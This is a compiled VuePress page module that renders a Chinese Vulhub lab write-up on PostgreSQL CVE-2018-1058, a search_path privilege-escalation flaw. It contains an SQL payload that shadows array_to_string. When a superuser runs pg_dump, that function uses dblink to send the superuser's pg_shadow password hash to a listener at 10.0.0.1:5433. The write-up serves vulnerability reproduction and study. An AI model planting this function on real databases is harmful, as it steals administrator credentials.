import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as i,c as n,a as e,b as a,d as o,e as d}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。",-1),u=e("p",null,"参考链接：",-1),_={href:"https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path",target:"_blank",rel:"noopener noreferrer"},h={href:"https://xianzhi.aliyun.com/forum/topic/2109",target:"_blank",rel:"noopener noreferrer"},g=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>启动存在漏洞的环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，将在本地开启PG默认的5432端口。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Vulhub参考上述链接中的第二种利用方式，我们先通过普通用户<code>vulhub:vulhub</code>的身份登录postgres: <code>psql --host your-ip --username vulhub</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1-168180309118051.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行如下语句后退出：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select &#39;hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname=&#39;||(SELECT passwd FROM pg_shadow WHERE usename=&#39;postgres&#39;))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后我在<code>10.0.0.1</code>上监听5433端口，等待超级用户触发我们留下的这个“后门”。</p><p>（假装自己是超级用户）在靶场机器下，用超级用户的身份执行<code>pg_dump</code>命令：<code>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</code>，导出vulhub这个数据库的内容。</p><p>执行上述命令的同时，“后门”已被触发，<code>10.0.0.1</code>机器上已收到敏感信息：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2-168180309118152.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上述过程仅是该漏洞的一种利用方法，涉及到机器比较多可能有点乱，建议读者阅读参考链接中的文章，获取更多利用方法。</p>`,14);function m(b,v){const t=s("ExternalLinkIcon");return i(),n("div",null,[l,p,u,e("ul",null,[e("li",null,[e("a",_,[a("https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path"),o(t)])]),e("li",null,[e("a",h,[a("https://xianzhi.aliyun.com/forum/topic/2109"),o(t)])])]),g])}const E=r(c,[["render",m],["__file","PostgreSQL 提权漏洞 CVE-2018-1058.html.vue"]]);export{E as default};
